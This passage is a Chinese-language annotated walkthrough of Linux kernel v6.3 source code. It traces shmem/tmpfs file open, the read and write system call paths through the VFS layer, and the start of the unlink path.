// 如果文件以写模式打开且不是特殊文件，授予写访问权限 &#125; else if (f-&gt;f_mode &amp; FMODE_WRITE &amp;&amp; !special_file(inode-&gt;i_mode)) &#123; error = get_write_access(inode); if (unlikely(error)) goto cleanup_file; error = __mnt_want_write(f-&gt;f_path.mnt); if (unlikely(error)) &#123; put_write_access(inode); goto cleanup_file; &#125; f-&gt;f_mode |= FMODE_WRITER; &#125; // 为常规文件和目录启用原子位置 if (S_ISREG(inode-&gt;i_mode) || S_ISDIR(inode-&gt;i_mode)) f-&gt;f_mode |= FMODE_ATOMIC_POS; /* 设置其他f_mode标志,获取shmem_file_operations作为f_op */ f-&gt;f_op = fops_get(inode-&gt;i_fop); if (WARN_ON(!f-&gt;f_op)) &#123; error = -ENODEV; goto cleanup_all; &#125; /* 调用security_file_open()和break_lease() */ error = security_file_open(f); if (error) goto cleanup_all; // 检查文件上是否存在需要中断的活动租约 error = break_lease(file_inode(f), f-&gt;f_flags); if (error) goto cleanup_all; // 为寻找、pread 和 pwrite 设置默认文件模式标志 f-&gt;f_mode |= FMODE_LSEEK | FMODE_PREAD | FMODE_PWRITE; // 使用文件操作提供的 open 函数，如果未提供，则使用默认值 if (!open) open = f-&gt;f_op-&gt;open; if (open) &#123; error = open(inode, f); if (error) goto cleanup_all; &#125; // 设置文件模式标志以表示文件已打开 f-&gt;f_mode |= FMODE_OPENED; // 根据相应操作的可用性设置读写能力 if ((f-&gt;f_mode &amp; FMODE_READ) &amp;&amp; likely(f-&gt;f_op-&gt;read || f-&gt;f_op-&gt;read_iter)) f-&gt;f_mode |= FMODE_CAN_READ; if ((f-&gt;f_mode &amp; FMODE_WRITE) &amp;&amp; likely(f-&gt;f_op-&gt;write || f-&gt;f_op-&gt;write_iter)) f-&gt;f_mode |= FMODE_CAN_WRITE; // 如果 llseek 操作不可用，则禁用寻找 if ((f-&gt;f_mode &amp; FMODE_LSEEK) &amp;&amp; !f-&gt;f_op-&gt;llseek) f-&gt;f_mode &amp;= ~FMODE_LSEEK; // 如果地址空间操作支持，则启用直接 I/O if (f-&gt;f_mapping-&gt;a_ops &amp;&amp; f-&gt;f_mapping-&gt;a_ops-&gt;direct_IO) f-&gt;f_mode |= FMODE_CAN_ODIRECT; // 清除不必要的打开标志 f-&gt;f_flags &amp;= ~(O_CREAT | O_EXCL | O_NOCTTY | O_TRUNC); // 为文件设置 iocb 标志 f-&gt;f_iocb_flags = iocb_flags(f); // 初始化文件的预读状态 file_ra_state_init(&amp;f-&gt;f_ra, f-&gt;f_mapping-&gt;host-&gt;i_mapping); // 如果请求 O_DIRECT 但不支持，则返回错误 if ((f-&gt;f_flags &amp; O_DIRECT) &amp;&amp; !(f-&gt;f_mode &amp; FMODE_CAN_ODIRECT)) return -EINVAL; // 如果文件以写模式打开，请确保不使用巨大的页面缓存 if (f-&gt;f_mode &amp; FMODE_WRITE) &#123; smp_mb(); // 为后续操作确保内存排序 // 检查页面缓存中是否有任何巨大的页面 if (filemap_nr_thps(inode-&gt;i_mapping)) &#123; struct address_space *mapping = inode-&gt;i_mapping; // 锁定页面缓存并使其无效 filemap_invalidate_lock(inode-&gt;i_mapping); // 取消映射文件的内存范围 unmap_mapping_range(mapping, 0, 0, 0); // 截断页面缓存中的 inode 页面 truncate_inode_pages(mapping, 0); // 解锁页面缓存 filemap_invalidate_unlock(inode-&gt;i_mapping); &#125; &#125; return 0;cleanup_all: // 检查无效的正错误代码并重置为 -EINVAL if (WARN_ON_ONCE(error &gt; 0)) error = -EINVAL; // 释放文件操作结构 fops_put(f-&gt;f_op); // 释放文件访问 put_file_access(f);cleanup_file: // 减少路径的引用计数并清除文件的路径和 inode path_put(&amp;f-&gt;f_path); f-&gt;f_path.mnt = NULL; f-&gt;f_path.dentry = NULL; f-&gt;f_inode = NULL; return error;&#125; open &#x3D; f-&gt;f_op-&gt;open设置为generic_filp_open函数generic_file_open identifier - Linux source code (v6.3.6) - Bootlin 123456789101112131415161718// 定义一个通用文件打开函数，它在一个inode即将被打开时调用。// 用于在32位系统中禁止打开大文件，除非调用者指定了O_LARGEFILE标志。// 在64位系统中，sys_open函数会强制使用这个标志。int generic_file_open(struct inode *inode, struct file *filp)&#123; // 检查filp-&gt;f_flags是否设置了O_LARGEFILE标志。如果没有设置 // 并且文件大小（通过i_size_read获取）大于MAX_NON_LFS（文件系统的最大文件限制）， // 则禁止打开该文件。 if (!(filp-&gt;f_flags &amp; O_LARGEFILE) &amp;&amp; i_size_read(inode) &gt; MAX_NON_LFS) // 如果条件满足，返回-EOVERFLOW表示文件太大，无法打开。 return -EOVERFLOW; // 如果文件大小在允许的范围内，返回0表示成功打开文件。 return 0;&#125;// 将generic_file_open函数导出为可供其他模块调用的符号。EXPORT_SYMBOL(generic_file_open); 首先这段代码f-&gt;f_op = fops_get(inode-&gt;i_fop);将f-&gt;f_op设置为shmem_file_operations 123456789101112131415// 定义shmem文件系统的文件操作结构体static const struct file_operations shmem_file_operations = &#123; .mmap = shmem_mmap, // 映射文件到内存的操作 .open = generic_file_open, // 打开文件的通用操作 .get_unmapped_area = shmem_get_unmapped_area, // 获取未映射区域的操作#ifdef CONFIG_TMPFS .llseek = shmem_file_llseek, // 重定位文件读写指针的操作 .read_iter = shmem_file_read_iter, // 读取文件的操作 .write_iter = generic_file_write_iter, // 写入文件的通用操作 .fsync = noop_fsync, // 同步文件的空操作（因为shmem文件系统不需要同步） .splice_read = generic_file_splice_read, // 从文件中读取并拼接数据的通用操作 .splice_write = iter_file_splice_write, // 向文件中拼接并写入数据的操作 .fallocate = shmem_fallocate, // 预分配文件空间的操作#endif&#125;; 为什么设置为shmem_file_operations呢？根据上文对shmem_get_inode的解析，里面有这一段代码inode-&gt;i_fop = &amp;shmem_file_operations; 读写文件读文件read系统调用sys_read identifier - Linux source code (v6.3.7) - Bootlin 1234SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)&#123; return ksys_read(fd, buf, count);&#125; ksys_read函数ksys_read identifier - Linux source code (v6.3.7) - Bootlin 1234567891011121314151617181920212223242526272829303132// 定义 ksys_read 函数，参数包括：文件描述符（fd），用户缓冲区（buf）和要读取的字节数（count）ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)&#123; // 从给定的文件描述符（fd）获取文件描述符对象（f），并将返回值（ret）初始化为 -EBADF（错误：错误的文件描述符） struct fd f = fdget_pos(fd); ssize_t ret = -EBADF; // 如果文件描述符对象有效（不为 NULL） if (f.file) &#123; // 声明一个变量（pos）来存储文件中的当前位置和指向位置的指针（ppos） loff_t pos, *ppos = file_ppos(f.file); // 如果位置指针（ppos）不为 NULL，则将当前位置存储在变量（pos）中，并更新指针以指向它 if (ppos) &#123; pos = *ppos; ppos = &amp;pos; &#125; // 调用 vfs_read 函数从文件中读取数据到用户缓冲区（buf），并将结果存储在返回值（ret）中 ret = vfs_read(f.file, buf, count, ppos); // 如果读取操作成功（ret &gt;= 0）且位置指针不为 NULL，则更新文件描述符对象中的文件位置 if (ret &gt;= 0 &amp;&amp; ppos) f.file-&gt;f_pos = pos; // 释放文件描述符对象并更新文件位置 fdput_pos(f); &#125; // 返回读取操作的结果（已读取的字节数或错误代码） return ret;&#125; vfs_read函数vfs_read identifier - Linux source code (v6.3.7) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 定义 vfs_read 函数，参数包括：文件指针 (file)，用户缓冲区 (buf)，要读取的字节数 (count)，文件位置指针 (pos)ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)&#123; ssize_t ret; // 检查文件是否可读，如果不可读则返回 -EBADF 错误 if (!(file-&gt;f_mode &amp; FMODE_READ)) return -EBADF; // 检查文件是否支持读操作，如果不支持则返回 -EINVAL 错误 if (!(file-&gt;f_mode &amp; FMODE_CAN_READ)) return -EINVAL; // 检查用户缓冲区是否可以被访问，如果不可访问则返回 -EFAULT 错误 if (unlikely(!access_ok(buf, count))) return -EFAULT; // 验证读取区域是否合法，如果不合法则返回错误 ret = rw_verify_area(READ, file, pos, count); if (ret) return ret; // 如果要读取的字节数超过最大值，则将 count 设置为最大值 if (count &gt; MAX_RW_COUNT) count = MAX_RW_COUNT; // 如果文件操作结构中有 read 函数，则调用它执行读取操作 if (file-&gt;f_op-&gt;read) ret = file-&gt;f_op-&gt;read(file, buf, count, pos); // 如果文件操作结构中有 read_iter 函数，则调用 new_sync_read 函数执行同步读取操作 else if (file-&gt;f_op-&gt;read_iter) ret = new_sync_read(file, buf, count, pos); // 如果没有适当的读取函数，则返回 -EINVAL 错误 else ret = -EINVAL; // 如果读取成功，执行文件访问通知并更新读取的字符数 if (ret &gt; 0) &#123; fsnotify_access(file); add_rchar(current, ret); &#125; // 增加系统调用计数 inc_syscr(current); // 返回读取操作的结果（已读取的字节数或错误代码） return ret;&#125; file-&gt;f_op-&gt;read_iter设置为shmem_file_read_iter参考上文open = f-&gt;f_op-&gt;open设置为generic_filp_open函数，同理，read_iter被设置为shmem_file_read_iter 12345678910111213// 定义shmem文件系统的文件操作结构体static const struct file_operations shmem_file_operations = &#123; .mmap = shmem_mmap, // 映射文件到内存的操作 .open = generic_file_open, // 打开文件的通用操作 .get_unmapped_area = shmem_get_unmapped_area, // 获取未映射区域的操作#ifdef CONFIG_TMPFS .llseek = shmem_file_llseek, // 重定位文件读写指针的操作 .read_iter = shmem_file_read_iter, // 读取文件的操作 .write_iter = generic_file_write_iter, // 写入文件的通用操作 .fsync = noop_fsync, // 同步文件的空操作（因为shmem文件系统不需要同步） .splice_read = generic_file_splice_read, // 从文件中读取并拼接数据的通用操作 .splice_write = iter_file_splice_write, // 向文件中拼接并写入数据的操作 .fallocate = shmem_fallocate, // 预分配文件空间的 由于shmem_fille_operations没有定义read 根据如下vfs_read代码 123456789 // 如果文件操作结构中有 read 函数，则调用它执行读取操作if (file-&gt;f_op-&gt;read) ret = file-&gt;f_op-&gt;read(file, buf, count, pos);// 如果文件操作结构中有 read_iter 函数，则调用 new_sync_read 函数执行同步读取操作else if (file-&gt;f_op-&gt;read_iter) ret = new_sync_read(file, buf, count, pos);// 如果没有适当的读取函数，则返回 -EINVAL 错误else ret = -EINVAL; 下面会调用new_sync_read函数 new_sync_read函数new_sync_read identifier - Linux source code (v6.3.7) - Bootlin 12345678910111213141516171819202122// 定义一个同步读取函数，用于从文件中读取数据到用户缓冲区static ssize_t new_sync_read(struct file *filp, char __user *buf, size_t len, loff_t *ppos)&#123; struct kiocb kiocb; // 定义一个IO控制块（IOCB）结构体实例 struct iov_iter iter; // 定义一个IO向量迭代器（用于描述用户缓冲区） ssize_t ret; // 用于存储函数返回值（读取的字节数） init_sync_kiocb(&amp;kiocb, filp); // 使用文件指针初始化同步IOCB kiocb.ki_pos = (ppos ? *ppos : 0); // 设置IOCB的文件位置（如果ppos非空，则使用*ppos，否则使用0） // 初始化IO向量迭代器，将其与用户缓冲区关联 iov_iter_ubuf(&amp;iter, ITER_DEST, buf, len); // 调用文件系统的read_iter方法（如果存在），并将结果存储到ret变量中 ret = call_read_iter(filp, &amp;kiocb, &amp;iter); BUG_ON(ret == -EIOCBQUEUED); // 如果返回值为-EIOCBQUEUED，触发内核bug（因为这是一个同步操作） if (ppos) // 如果ppos非空 *ppos = kiocb.ki_pos; // 将IOCB的文件位置更新到ppos变量中 return ret; // 返回读取的字节数&#125; call_read_iter函数call_read_iter identifier - Linux source code (v6.3.7) - Bootlin 12345static inline ssize_t call_read_iter(struct file *file, struct kiocb *kio, struct iov_iter *iter)&#123; return file-&gt;f_op-&gt;read_iter(kio, iter);&#125; shmem_file_read_iter函数由上文可知，file-&gt;f_op-&gt;read_iter设置为shmem_file_read_read shmem_file_read_iter identifier - Linux source code (v6.3.6) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110// 定义shmem文件系统的文件读取函数static ssize_t shmem_file_read_iter(struct kiocb *iocb, struct iov_iter *to)&#123; // 定义一些局部变量 struct file *file = iocb-&gt;ki_filp; struct inode *inode = file_inode(file); struct address_space *mapping = inode-&gt;i_mapping; pgoff_t index; unsigned long offset; int error = 0; ssize_t retval = 0; loff_t *ppos = &amp;iocb-&gt;ki_pos; // 计算要读取的页索引和页内偏移量 index = *ppos &gt;&gt; PAGE_SHIFT; offset = *ppos &amp; ~PAGE_MASK; // 循环读取数据，直到读完或出错 for (;;) &#123; struct folio *folio = NULL; struct page *page = NULL; pgoff_t end_index; unsigned long nr, ret; loff_t i_size = i_size_read(inode); // 计算文件的最后一个页索引 end_index = i_size &gt;&gt; PAGE_SHIFT; if (index &gt; end_index) break; if (index == end_index) &#123; nr = i_size &amp; ~PAGE_MASK; if (nr &lt;= offset) break; &#125; // 获取所需页的folio error = shmem_get_folio(inode, index, &amp;folio, SGP_READ); if (error) &#123; if (error == -EINVAL) error = 0; break; &#125; if (folio) &#123; folio_unlock(folio); // 获取文件页 page = folio_file_page(folio, index); if (PageHWPoison(page)) &#123; folio_put(folio); error = -EIO; break; &#125; &#125; // 计算要读取的字节数 nr = PAGE_SIZE; i_size = i_size_read(inode); end_index = i_size &gt;&gt; PAGE_SHIFT; if (index == end_index) &#123; nr = i_size &amp; ~PAGE_MASK; if (nr &lt;= offset) &#123; if (folio) folio_put(folio); break; &#125; &#125; nr -= offset; if (folio) &#123; // 如果有写入映射，刷新数据缓存 if (mapping_writably_mapped(mapping)) flush_dcache_page(page); // 如果读取页的开始，标记页为已访问 if (!offset) folio_mark_accessed(folio); // 将页的内容复制到用户空间 ret = copy_page_to_iter(page, offset, nr, to); folio_put(folio); &#125; else if (user_backed_iter(to)) &#123; // 用零页代替清空用户空间，提高效率 ret = copy_page_to_iter(ZERO_PAGE(0), offset, nr, to); &#125; else &#123; // 对于管道等，避免连续两次提交相同的页 ret = iov_iter_zero(nr, to); &#125; // 更新读取计数和偏移量 retval += ret; offset += ret; index += offset &gt;&gt; PAGE_SHIFT; offset &amp;= ~PAGE_MASK; // 检查是否还有数据需要读取 if (!iov_iter_count(to)) break; if (ret &lt; nr) &#123; error = -EFAULT; break; &#125; cond_resched(); &#125; // 更新文件位置 *ppos = ((loff_t) index &lt;&lt; PAGE_SHIFT) + offset; // 标记文件访问 file_accessed(file); // 返回读取的字节数或错误码 return retval ? retval : error;&#125; 写文件write系统调用sys_write identifier - Linux source code (v6.3.7) - Bootlin 12345SYSCALL_DEFINE3(write, unsigned int, fd, const char __user *, buf, size_t, count)&#123; return ksys_write(fd, buf, count);&#125; ksys_write函数ksys_write identifier - Linux source code (v6.3.7) - Bootlin 12345678910111213141516171819ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count)&#123; // 函数签名，接受三个参数：文件描述符 fd、用户空间缓冲区的指针 buf 和要写入的字节数 count struct fd f = fdget_pos(fd); // 获取与文件描述符 fd 相关联的 struct fd 对象（同时获取文件对象和位置） ssize_t ret = -EBADF; // 初始化返回值为 -EBADF（表示无效的文件描述符） if (f.file) &#123; // 如果文件描述符有效（即 f.file 非 NULL） loff_t pos, *ppos = file_ppos(f.file); // 获取文件的当前写入位置 if (ppos) &#123; // 如果 ppos 非 NULL pos = *ppos; // 保存文件的当前写入位置到 pos ppos = &amp;pos; // ppos 指向 pos 的地址 &#125; ret = vfs_write(f.file, buf, count, ppos); // 调用 vfs_write 函数进行实际的写操作，并将返回值赋给 ret if (ret &gt;= 0 &amp;&amp; ppos) // 如果写操作成功（ret &gt;= 0）且 ppos 非 NULL f.file-&gt;f_pos = pos; // 更新文件对象的写入位置 fdput_pos(f); // 释放 struct fd 对象（减少引用计数） &#125; return ret; // 返回写操作的结果，如果成功则返回写入的字节数，否则返回一个负的错误码&#125; vfs_write函数vfs_write identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536ssize_t vfs_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)&#123; // 函数签名，接受四个参数：文件对象指针 file、用户空间缓冲区的指针 buf、要写入的字节数 count 和文件写入位置 pos 的指针 ssize_t ret; // 定义返回值变量 if (!(file-&gt;f_mode &amp; FMODE_WRITE)) return -EBADF; // 如果文件不可写，返回 -EBADF（错误的文件描述符） if (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE)) return -EINVAL; // 如果文件模式不允许写入，返回 -EINVAL（无效参数） if (unlikely(!access_ok(buf, count))) return -EFAULT; // 如果用户空间缓冲区不可访问，返回 -EFAULT（错误的地址） ret = rw_verify_area(WRITE, file, pos, count); // 验证写入请求是否合法，将结果赋给 ret if (ret) return ret; // 如果验证结果为非零值（错误），则返回该值 if (count &gt; MAX_RW_COUNT) count = MAX_RW_COUNT; // 如果要写入的字节数大于最大允许值，则限制写入字节数为最大允许值 file_start_write(file); // 准备文件开始写入 if (file-&gt;f_op-&gt;write) ret = file-&gt;f_op-&gt;write(file, buf, count, pos); // 如果定义了 write 函数，调用它进行实际的写操作，并将返回值赋给 ret else if (file-&gt;f_op-&gt;write_iter) ret = new_sync_write(file, buf, count, pos); // 否则，如果定义了 write_iter 函数，调用 new_sync_write 函数进行写操作，并将返回值赋给 ret else ret = -EINVAL; // 如果没有定义 write 或 write_iter 函数，返回 -EINVAL（无效参数） if (ret &gt; 0) &#123; // 如果写操作成功（ret &gt; 0） fsnotify_modify(file); // 通知相关文件系统事件 add_wchar(current, ret); // 更新当前进程的写入字符计数（增加 ret 个字符） &#125; inc_syscw(current); // 增加当前进程的系统调用计数 file_end_write(file); // 结束文件写入 return ret; // 返回写操作的结果，如果成功则返回写入的字节数，否则返回一个负的错误码&#125; file-&gt;f_op-&gt;write_iter设置为generic_file_write_iter参考上文中的file-&gt;f_op-&gt;read_iter设置为shmem_file_read_iter 12345678910111213// 定义shmem文件系统的文件操作结构体static const struct file_operations shmem_file_operations = &#123; .mmap = shmem_mmap, // 映射文件到内存的操作 .open = generic_file_open, // 打开文件的通用操作 .get_unmapped_area = shmem_get_unmapped_area, // 获取未映射区域的操作#ifdef CONFIG_TMPFS .llseek = shmem_file_llseek, // 重定位文件读写指针的操作 .read_iter = shmem_file_read_iter, // 读取文件的操作 .write_iter = generic_file_write_iter, // 写入文件的通用操作 .fsync = noop_fsync, // 同步文件的空操作（因为shmem文件系统不需要同步） .splice_read = generic_file_splice_read, // 从文件中读取并拼接数据的通用操作 .splice_write = iter_file_splice_write, // 向文件中拼接并写入数据的操作 .fallocate = shmem_fallocate, // 预分配文件空间的 可以看到write_iter设置为generic_file_write_iter 根据下面这段vfs_write代码 123456 if (file-&gt;f_op-&gt;write) ret = file-&gt;f_op-&gt;write(file, buf, count, pos); // 如果定义了 write 函数，调用它进行实际的写操作，并将返回值赋给 retelse if (file-&gt;f_op-&gt;write_iter) ret = new_sync_write(file, buf, count, pos); // 否则，如果定义了 write_iter 函数，调用 new_sync_write 函数进行写操作，并将返回值赋给 retelse ret = -EINVAL; // 如果没有定义 write 或 write_i 因为shmem_file_operation没有设置write函数，所以下面进入new_sync_write函数 new_sync_write函数new_sync_write identifier - Linux source code (v6.3.7) - Bootlin 12345678910111213141516static ssize_t new_sync_write(struct file *filp, const char __user *buf, size_t len, loff_t *ppos)&#123; struct kiocb kiocb; struct iov_iter iter; ssize_t ret; init_sync_kiocb(&amp;kiocb, filp); kiocb.ki_pos = (ppos ? *ppos : 0); iov_iter_ubuf(&amp;iter, ITER_SOURCE, (void __user *)buf, len); ret = call_write_iter(filp, &amp;kiocb, &amp;iter); BUG_ON(ret == -EIOCBQUEUED); if (ret &gt; 0 &amp;&amp; ppos) *ppos = kiocb.ki_pos; return ret;&#125; call_write_iter函数call_write_iter identifier - Linux source code (v6.3.7) - Bootlin 12345static inline ssize_t call_write_iter(struct file *file, struct kiocb *kio, struct iov_iter *iter)&#123; return file-&gt;f_op-&gt;write_iter(kio, iter);&#125; generic_file_write_iter函数 generic_file_write_iter identifier - Linux source code (v6.3.7) - Bootlin 12345678910111213141516171819202122232425262728/** * generic_file_write_iter - 将数据写入文件 * @iocb: IO 状态结构 * @from: 带有要写入数据的 iov_iter * * 这是一个用于大多数文件系统的 __generic_file_write_iter() 的封装。 * 它负责在 O_SYNC 文件情况下同步文件，并根据需要获取 i_rwsem。 * 返回： * * 如果没有写入任何数据或 vfs_fsync_range() 在同步写入时失败，则返回负错误代码 * * 写入的字节数，即使是截断写入 */ssize_t generic_file_write_iter(struct kiocb *iocb, struct iov_iter *from)&#123; struct file *file = iocb-&gt;ki_filp; // 从 kiocb 获取文件指针 struct inode *inode = file-&gt;f_mapping-&gt;host; // 从文件的映射主机获取 inode ssize_t ret; // 声明结果的返回变量 inode_lock(inode); // 在写入之前锁定 inode ret = generic_write_checks(iocb, from); // 执行通用写入检查 if (ret &gt; 0) // 如果检查通过且允许写入 ret = __generic_file_write_iter(iocb, from); // 调用实际的文件写入函数 inode_unlock(inode); // 写入后解锁 inode if (ret &gt; 0) // 如果写入成功 ret = generic_write_sync(iocb, ret); // 如果需要（例如，设置了 O_SYNC 标志），同步写入的数据 return ret; // 返回结果（写入的字节数或错误代码）&#125;EXPORT_SYMBOL(generic_file_write_iter); __generic_file_write_iter__generic_file_write_iter identifier - Linux source code (v6.3.7) - Bootlin 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/** * __generic_file_write_iter - 将数据写入文件 * @iocb: IO 状态结构（文件，偏移等） * @from: 带有要写入数据的 iov_iter * * 此函数完成实际将数据写入文件所需的所有工作。它执行所有基本检查，从文件中删除 SUID， * 更新修改时间，并根据我们执行直接 IO 还是标准缓冲写入来调用适当的子程序。 * * 除非我们在块设备或类似不需要锁定的对象上工作，否则期望已获得 i_rwsem。 * * 此函数*不*负责在 O_SYNC 写入时同步数据。调用者必须处理它。这主要是因为我们要 * 避免在 i_rwsem 下进行同步。 * * 返回： * * 写入的字节数，即使是截断的写入 * * 如果没有写入任何数据，则为负错误代码 */ssize_t __generic_file_write_iter(struct kiocb *iocb, struct iov_iter *from)&#123; struct file *file = iocb-&gt;ki_filp; // 获取文件指针 struct address_space *mapping = file-&gt;f_mapping; // 获取文件的地址空间映射 struct inode *inode = mapping-&gt;host; // 获取映射主机的 inode ssize_t written = 0; // 初始化已写字节数为 0 ssize_t err; // 错误变量 ssize_t status; // 状态变量 // 我们可以在页面回收中写回此队列 current-&gt;backing_dev_info = inode_to_bdi(inode); err = file_remove_privs(file); // 移除文件的特权 if (err) goto out; err = file_update_time(file); // 更新文件时间 if (err) goto out; if (iocb-&gt;ki_flags &amp; IOCB_DIRECT) &#123; // 如果使用直接 IO loff_t pos, endbyte; written = generic_file_direct_write(iocb, from); // 执行直写 /* * 如果写入未完成，回退到缓冲写入。例如，某些文件系统对洞的写入就是这样。 * 对于 DAX 文件，缓冲写入将无法成功（即使成功，DAX 也无法正确处理脏的 * 页面缓存页面）。 */ if (written &lt; 0 || !iov_iter_count(from) || IS_DAX(inode)) goto out; pos = iocb-&gt;ki_pos; status = generic_perform_write(iocb, from); // 执行回写 /* * 如果 generic_perform_write() 返回了同步错误，则我们希望返回直接写入 * 的字节数，或者如果为零，则返回错误代码。请注意，这与正常的直接 IO 语义 * 不同，即使写入了一些字节，也会返回 -EFOO。 */ if (unlikely(status &lt; 0)) &#123; err = status; goto out; &#125; /* * 我们需要确保页面缓存页面被写入磁盘并失效，以保留预期的 O_DIRECT 语义。 */ endbyte = pos + status - 1; err = filemap_write_and_wait_range(mapping, pos, endbyte); if (err == 0) &#123; iocb-&gt;ki_pos = endbyte + 1; written += status; invalidate_mapping_pages(mapping, pos &gt;&gt; PAGE_SHIFT, endbyte &gt;&gt; PAGE_SHIFT); &#125; else &#123; /* * 我们不知道写了多少，所以只返回直接写入的字节数 */ &#125; &#125; else &#123; written = generic_perform_write(iocb, from); // 执行回写 if (likely(written &gt; 0)) iocb-&gt;ki_pos += written; &#125;out: current-&gt;backing_dev_info = NULL; return written ? written : err;&#125;EXPORT_SYMBOL(__generic_file_write_iter); generic_file_direct_write函数generic_file_direct_write identifier - Linux source code (v6.3.7) - Bootlin 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182ssize_t generic_file_direct_write(struct kiocb *iocb, struct iov_iter *from) &#123; struct file *file = iocb-&gt;ki_filp; //获取文件对象 struct address_space *mapping = file-&gt;f_mapping; //获取地址空间 struct inode *inode = mapping-&gt;host; //获取索引节点对象 loff_t pos = iocb-&gt;ki_pos; //获取写入位置 ssize_t written; size_t write_len; pgoff_t end; write_len = iov_iter_count(from); //获取要写入的数据长度 end = (pos + write_len - 1) &gt;&gt; PAGE_SHIFT; //计算结束页号 if (iocb-&gt;ki_flags &amp; IOCB_NOWAIT) &#123; //如果是非阻塞IO /* 如果有要写回的页面,返回 */ if (filemap_range_has_page(file-&gt;f_mapping, pos, //判断范围内是否有页面 pos + write_len - 1)) return -EAGAIN; &#125; else &#123; written = filemap_write_and_wait_range(mapping, pos, //同步文件范围内的页面 pos + write_len - 1); if (written) goto out; &#125; /* * 在写入后,我们希望缓冲读取确实去磁盘获取 * 新数据。我们失效要写入区域的干净缓存页面。 * 我们在写入之前这样做,*之前*我们可以不破坏 * -&gt;direct_IO()返回的-EIOCBQUEUED。 */ written = invalidate_inode_pages2_range(mapping, //失效页面范围 pos &gt;&gt; PAGE_SHIFT, end); /* * 如果无法使页面无效,返回0以回退 * 到缓冲写入。 */ if (written) &#123; if (written == -EBUSY) return 0; goto out; &#125; written = mapping-&gt;a_ops-&gt;direct_IO(iocb, from); //执行direct IO写入 /* * 最后,再试一次使干净页面无效,这些页面可能 * 被非直接读前读入高速缓存,或者如果写的源 * 是文件的映射区域,则可能由get_user_pages()引起故障。 * 其中任何一个都是相当疯狂的事情要做, * 所以我们不完全支持它。如果此无效化 * 失败,那还行,写入仍然有效... * * 大多数时候我们不需要这么做,因为dio_complete() * 会为我们做无效化。然而,有一些文件系统 * 最终不会调用dio_complete(),所以不要通过 * 完全删除它来破坏它们。 * * 显著的例子是blkdev_direct_IO()。 * * 跳过异步写入的无效化或如果映射没有页面。 */ if (written &gt; 0 &amp;&amp; mapping-&gt;nrpages &amp;&amp; invalidate_inode_pages2_range(mapping, pos &gt;&gt; PAGE_SHIFT, end)) dio_warn_stale_pagecache(file); if (written &gt; 0) &#123; pos += written; //更新写入位置 write_len -= written; if (pos &gt; i_size_read(inode) &amp;&amp; !S_ISBLK(inode-&gt;i_mode)) &#123; //更新文件大小 i_size_write(inode, pos); mark_inode_dirty(inode); &#125; iocb-&gt;ki_pos = pos; &#125; if (written != -EIOCBQUEUED) iov_iter_revert(from, write_len - iov_iter_count(from)); out: return written; &#125; EXPORT_SYMBOL(generic_file_direct_write); generic_perform_write函数generic_perform_write identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475ssize_t generic_perform_write(struct kiocb *iocb, struct iov_iter *i)&#123; struct file *file = iocb-&gt;ki_filp; //获取文件对象 loff_t pos = iocb-&gt;ki_pos; //获取写入位置 struct address_space *mapping = file-&gt;f_mapping; //获取地址空间 const struct address_space_operations *a_ops = mapping-&gt;a_ops; //获取地址空间操作 long status = 0; ssize_t written = 0; do &#123; struct page *page; unsigned long offset; /* Offset into pagecache page */ unsigned long bytes; /* Bytes to write to page */ size_t copied; /* Bytes copied from user */ void *fsdata = NULL; offset = (pos &amp; (PAGE_SIZE - 1)); bytes = min_t(unsigned long, PAGE_SIZE - offset, //计算本次要写入的字节数 iov_iter_count(i));again: /* * 首先带入用户页面,我们要从中复制。 * 否则,如果未将其标记为最新,则会出现从 * 同一页面复制和写入的可怕死锁。 */ if (unlikely(fault_in_iov_iter_readable(i, bytes) == bytes)) &#123; status = -EFAULT; break; &#125; if (fatal_signal_pending(current)) &#123; status = -EINTR; break; &#125; status = a_ops-&gt;write_begin(file, mapping, pos, bytes, //执行写开始 &amp;page, &amp;fsdata); if (unlikely(status &lt; 0)) break; if (mapping_writably_mapped(mapping)) //刷新页高速缓存 flush_dcache_page(page); copied = copy_page_from_iter_atomic(page, offset, bytes, i); //从迭代器复制数据到页面 flush_dcache_page(page); status = a_ops-&gt;write_end(file, mapping, pos, bytes, copied, //执行写结束 page, fsdata); if (unlikely(status != copied)) &#123; iov_iter_revert(i, copied - max(status, 0L)); if (unlikely(status &lt; 0)) break; &#125; cond_resched(); if (unlikely(status == 0)) &#123; /* * 短复制导致-&gt;write_end()完全拒绝 * 该事物。可能是中途的内存中毒,可能与munmap的竞争, * 可能是严重的内存压力。 */ if (copied) bytes = copied; goto again; &#125; pos += status; //更新写入位置 written += status; balance_dirty_pages_ratelimited(mapping); &#125; while (iov_iter_count(i)); return written ? written : status; &#125; EXPORT_SYMBOL(generic_perform_write); 删除文件unlink系统调用sys_unlink identifier - Linux source code (v6.3.7) - Bootlin 1234 SYSCALL_DEFINE1(unlink, const char __user *, pathname)&#123; return do_unlinkat(AT_FDCWD, getname(pathname));&#125; do_unlinkat函数do_unlinkat identifier - Linux source code (v6.3.7) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/* * 确保文件的实际截断发生在其目录的 i_mutex 外部。 * 如果发生大量写出，截断可能需要很长时间， * 我们不希望在等待 I/O 时阻止对目录的访问。 */int do_unlinkat(int dfd, struct filename *name)&#123; int error; // 错误码 struct dentry *dentry; // 目录项指针 struct path path; // 路径结构体 struct qstr last; // 最后一个路径组件的字符串 int type; // 路径类型 struct inode *inode = NULL; // 文件 inode 指针 struct inode *delegated_inode = NULL; // 委托 inode 指针 unsigned int lookup_flags = 0; // 查找标志retry: // 重试标签 error = filename_parentat(dfd, name, lookup_flags, &amp;path, &amp;last, 